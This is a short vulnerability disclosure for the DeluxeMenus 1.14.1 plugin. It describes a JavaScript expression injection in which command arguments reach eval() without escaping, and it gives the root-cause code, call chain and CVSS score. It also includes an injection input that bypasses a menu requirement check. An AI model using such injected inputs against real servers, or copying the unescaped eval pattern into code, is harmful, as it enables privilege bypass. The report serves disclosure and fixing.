# DeluxeMenus-JavaScript-expression-injection
Version: 1.14.1
Type: CWE-94 — JavaScript expression injection
Impact: type: javascript requirement bypass (confirmed)
CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N → 6.5 Medium

# Root cause
JavascriptRequirement.java:

String exp = holder.setPlaceholdersAndArguments(expression);
Object result = engine.getEngineByName("JavaScript").eval(exp);

MenuHolder.setPlaceholdersAndArguments() substitutes arguments/placeholders into the string without JS escaping; the result is passed to eval().

## Chain: RegistrableMenuCommand → MenuHolder.setArguments() → setPlaceholdersAndArguments() → eval().

POC IN FILE: poc_js.yml

## Steps:

/pocjs safe                      → PASSED   (expected)
/pocjs x' == 'no' || true || 'x  → PASSED   (bypass)

## After substitution:
'x' == 'no' || true || 'x' == 'safe'   // → true
